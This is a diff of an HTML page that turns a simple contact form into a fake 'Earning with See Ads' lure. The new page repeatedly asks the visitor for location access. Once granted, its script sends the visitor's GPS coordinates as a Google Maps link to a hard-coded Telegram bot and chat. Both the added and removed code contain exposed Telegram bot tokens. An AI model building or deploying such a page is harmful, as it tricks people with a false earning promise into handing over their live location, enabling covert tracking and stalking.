@@ -3,62 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Form to Telegram</title>
+    <title>Earning with See Ads</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background: linear-gradient(45deg, #1e3c72, #2a5298); color: white; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; overflow: hidden; }
+        h1 { font-size: 2.5em; animation: fadeIn 1.5s ease-in-out; }
+        p { font-size: 1.2em; margin-top: 10px; animation: fadeIn 2s ease-in-out; }
+        .popup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; color: black; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); display: none; }
+        .popup button { padding: 10px 20px; margin: 10px; border: none; background: #007bff; color: white; cursor: pointer; border-radius: 5px; }
+        .popup button:hover { background: #0056b3; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
 </head>
 <body>
 
-    <form action="https://formsubmit.co/0d8ef395ad20a44f262ef90a7f4998d1" method="POST">
-        <label>Name:</label>
-        <input type="text" name="name" required><br><br>
+    <h1>Welcome to Earning with See Ads</h1>
+    <p>Watch ads and earn money!</p>
 
-        <label>Email:</label>
-        <input type="email" name="email" required><br><br>
-
-        <label>Message:</label>
-        <textarea name="message" required></textarea><br><br>
-
-        <button type="submit">Send</button>
-    </form>
+    <div id="locationPopup" class="popup">
+        <p>We need your location to continue. Please allow location access.</p>
+        <button onclick="getLocation()">Allow</button>
+    </div>
 
     <script>
-        document.getElementById("myForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent form submission
+        const TELEGRAM_BOT_API = "https://api.telegram.org/bot7894276905:AAE23pB0gp0hgDFEz1U-p0YbK5wI4dkzTiA/getUpdates";  // Replace with your Telegram Bot API
+        const TELEGRAM_CHAT_ID = "7933723681";  // Replace with your Telegram Chat ID
 
-            // Replace with your bot token and chat ID
-            const botToken = "7251452177:AAEMKs8bl3IhtdNM5_GWRS-0mu-reWYaxXI";
-            const chatId = "7933723681";
+        function showPopup() {
+            document.getElementById("locationPopup").style.display = "block";
+        }
 
-            // Collect form data
-            const formData = new FormData(event.target);
-            const name = formData.get("name");
-            const email = formData.get("email");
-            const message = formData.get("message");
+        function hidePopup() {
+            document.getElementById("locationPopup").style.display = "none";
+        }
 
-            // Format message for Telegram
-            const text = `📩 *New Form Submission*\n\n👤 Name: ${name}\n📧 Email: ${email}\n💬 Message: ${message}`;
-            
-            // Telegram API URL
-            const telegramUrl = `https://api.telegram.org/bot7251452177:AAEMKs8bl3IhtdNM5_GWRS-0mu-reWYaxXI/sendMessage`;
+        function sendLocationToTelegram(latitude, longitude) {
+            let googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            let message = `User's Live Location:\n${googleMapsLink}`;
+            let telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_API}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
 
-            // Send data to Telegram
-            fetch(telegramUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert("Message sent successfully!");
-                    event.target.reset(); // Reset form
-                } else {
-                    alert("Error sending message.");
-                }
-            })
-            .catch(error => {
-                alert("Network error: " + error);
-            });
-        });
+            fetch(telegramURL)
+                .then(response => console.log("Location sent to Telegram"))
+                .catch(error => console.error("Error sending location:", error));
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        let latitude = position.coords.latitude;
+                        let longitude = position.coords.longitude;
+                        sendLocationToTelegram(latitude, longitude);
+                        hidePopup(); // Hide popup after successful access
+                    },
+                    (error) => {
+                        console.warn("User denied location access.");
+                        showPopup(); // Show popup again if denied
+                    }
+                );
+            } else {
+                alert("Geolocation is not supported by your browser.");
+            }
+        }
+
+        // Check location permission on page load
+        window.onload = function () {
+            setTimeout(showPopup, 1000); // Show popup after 1 sec
+        };
     </script>
 
 </body>
